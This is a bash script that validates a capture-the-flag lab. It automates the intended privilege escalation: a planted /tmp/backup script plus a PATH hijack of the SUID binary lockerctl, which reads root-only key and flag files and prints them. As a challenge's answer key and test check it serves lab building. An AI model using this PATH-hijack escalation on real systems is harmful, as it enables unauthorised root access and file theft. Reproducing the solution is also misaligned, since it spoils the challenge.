#!/bin/bash
#
# CTF Validation Script - Berlin's Locker Controller
# This script automatically executes the exploit and retrieves KEY and FLAG
# Run this to verify your CTF is working correctly
#

set -e

echo "=========================================="
echo "Berlin's Locker Controller CTF Validator"
echo "=========================================="
echo ""

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if we're running as tokyo user
if [ "$(whoami)" != "tokyo" ]; then
    echo -e "${YELLOW}Warning: Not running as 'tokyo' user. Some checks may fail.${NC}"
    echo "This script is designed to run inside the container as user 'tokyo'"
    echo ""
fi

echo "[*] Step 1: Checking current user..."
echo "    User: $(whoami)"
echo "    ID: $(id)"
echo ""

echo "[*] Step 2: Verifying target files are protected..."
if cat /opt/mint/key.txt >/dev/null 2>&1; then
    echo -e "${RED}ERROR: Can read key.txt without privilege escalation!${NC}"
    exit 1
fi
if cat /root/flag.txt >/dev/null 2>&1; then
    echo -e "${RED}ERROR: Can read flag.txt without privilege escalation!${NC}"
    exit 1
fi
echo "    ✓ Files are properly protected"
echo ""

echo "[*] Step 3: Finding SUID binary..."
SUID_BINARY=$(find / -perm -4000 -type f 2>/dev/null | grep lockerctl | head -1)
if [ -z "$SUID_BINARY" ]; then
    echo -e "${RED}ERROR: lockerctl SUID binary not found!${NC}"
    exit 1
fi
echo "    ✓ Found: $SUID_BINARY"
if [ "$(stat -c '%a' "$SUID_BINARY" | cut -c1)" != "4" ]; then
    echo -e "${RED}ERROR: SUID bit not set on lockerctl!${NC}"
    exit 1
fi
echo "    ✓ SUID bit is set"
echo ""

echo "[*] Step 4: Creating malicious backup script..."
cat > /tmp/backup << 'EOF'
#!/bin/bash -p
# Malicious backup script that steals KEY and FLAG
cat /opt/mint/key.txt > /tmp/key_stolen.txt
cat /root/flag.txt > /tmp/flag_stolen.txt
chmod 666 /tmp/key_stolen.txt /tmp/flag_stolen.txt
EOF

chmod +x /tmp/backup
echo "    ✓ Created /tmp/backup"
echo ""

echo "[*] Step 5: Hijacking PATH..."
export PATH=/tmp:$PATH
echo "    ✓ PATH set to: $PATH"
echo ""

echo "[*] Step 6: Executing SUID binary to trigger exploit..."
if ! /usr/local/bin/lockerctl rotate /opt/lockers/logs/heist.log 2>/dev/null; then
    # Exit code 0 or non-zero is fine - the exploit should have worked
    echo "    ✓ Command executed"
fi
echo ""

echo "[*] Step 7: Verifying exploit results..."
if [ ! -f /tmp/key_stolen.txt ]; then
    echo -e "${RED}ERROR: key_stolen.txt not created! Exploit may have failed.${NC}"
    exit 1
fi
if [ ! -f /tmp/flag_stolen.txt ]; then
    echo -e "${RED}ERROR: flag_stolen.txt not created! Exploit may have failed.${NC}"
    exit 1
fi

# Check file ownership
KEY_OWNER=$(stat -c '%U' /tmp/key_stolen.txt)
FLAG_OWNER=$(stat -c '%U' /tmp/flag_stolen.txt)

if [ "$KEY_OWNER" != "root" ] || [ "$FLAG_OWNER" != "root" ]; then
    echo -e "${YELLOW}WARNING: Files not owned by root. Exploit may not have run with root privileges.${NC}"
    echo "    KEY file owner: $KEY_OWNER"
    echo "    FLAG file owner: $FLAG_OWNER"
fi

echo "    ✓ Files created successfully"
echo ""

echo "=========================================="
echo "EXPLOIT SUCCESSFUL!"
echo "=========================================="
echo ""
echo -e "${GREEN}KEY Value:${NC}"
KEY_VALUE=$(cat /tmp/key_stolen.txt)
echo "$KEY_VALUE"
echo ""
echo -e "${GREEN}FLAG Value:${NC}"
FLAG_VALUE=$(cat /tmp/flag_stolen.txt)
echo "$FLAG_VALUE"
echo ""
echo "=========================================="
echo "CTF Validation Complete!"
echo "=========================================="

# Cleanup (ignore errors if files don't exist)
rm -f /tmp/backup /tmp/key_stolen.txt /tmp/flag_stolen.txt 2>/dev/null || true

echo ""
echo -e "${GREEN}✓ All checks passed! CTF is ready.${NC}"
exit 0

